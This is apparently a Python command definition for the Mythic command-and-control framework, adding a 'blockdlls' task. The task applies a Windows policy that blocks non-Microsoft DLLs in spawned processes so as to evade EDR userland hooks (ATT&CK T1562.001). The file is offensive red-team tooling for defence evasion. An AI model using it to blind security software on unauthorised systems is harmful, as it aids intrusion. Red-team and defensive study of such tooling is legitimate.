from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class BlockDllsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="block",
                cli_name="Block",
                display_name="Enable BlockDLLs",
                type=ParameterType.Boolean,
                default_value=True,
                description="Enable (true) or disable (false) BlockDLLs policy on all subsequently spawned processes.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=0)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Expected JSON arguments but got command line arguments.")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class BlockDllsCommand(CommandBase):
    cmd = "blockdlls"
    needs_admin = False
    help_cmd = "blockdlls (modal popup)"
    description = (
        "Toggle the BlockDLLs policy for all subsequently spawned sacrifice processes. "
        "When enabled, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON "
        "is applied to every new process created by spawn / spawnas / execute_assembly. "
        "Blocks EDR userland hooking DLLs but is detectable via kernel callbacks."
    )
    version = 1
    author = "@goultarde"
    attackmapping = ["T1562.001"]
    argument_class = BlockDllsArguments
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        block = taskData.args.get_arg("block")
        response.DisplayParams = "enabled" if block else "disabled"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
